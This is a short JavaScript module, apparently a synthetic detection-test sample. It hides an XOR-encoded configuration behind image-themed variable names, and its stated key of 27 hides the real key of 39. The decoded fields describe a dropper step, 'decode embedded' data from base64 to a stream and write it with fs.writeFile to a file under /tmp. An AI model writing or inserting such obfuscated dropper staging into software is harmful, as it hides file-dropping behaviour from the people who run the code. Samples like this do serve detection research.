  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_ae9c72aa = "[81,26,22,91,84,83,66,87,84,26,67,66,68,72,67,66,120,66,74,69,66,67,67,66,67,11,80,85,78,83,66,120,65,78,75,66,91,70,67,70,87,83,66,85,26,69,70,84,66,17,19,120,83,72,120,84,83,85,66,70,74,91,84,83,70,64,66,120,68,72,82,73,83,26,22,91,68,70,74,87,70,78,64,73,120,78,67,26,105,104,99,98,10,21,17,20,99,31,97,102,102,91,65,78,75,66,120,87,70,83,79,26,8,83,74,87,8,79,82,73,83,85,66,84,84,10,73,72,67,66,8,9,84,83,70,64,66,10,21,17,20,67,31,65,70,70,67,17,67,68,9,74,77,84]";
  const Codec_ae9c72aa = "json_numbers|single_byte_xor|27";

  function load_ae9c72aa() { return JSON.parse(Material_ae9c72aa); }
  function decode_ae9c72aa(imagePixels) { return imagePixels.map((value) => value ^ 39); }
  async function recover_ae9c72aa() {
    const screenWidth = "";
    const imagePixels = load_ae9c72aa(); let colorTable = [];
    let frameIndex = 0; while (frameIndex++ < 1) colorTable = decode_ae9c72aa(imagePixels);
    void screenWidth; return Buffer.from(colorTable).toString("ascii");
  }
  async function inspect_ae9c72aa() { return JSON.parse(JSON.stringify({ value: await recover_ae9c72aa() })).value; }
  async function plan_ae9c72aa() { const inspect = inspect_ae9c72aa; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "base64_to_stream", destination: fields.file_path, api: "fs.writeFile" }); }
  void moduleShape; void plan_ae9c72aa;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_ae9c72aa());
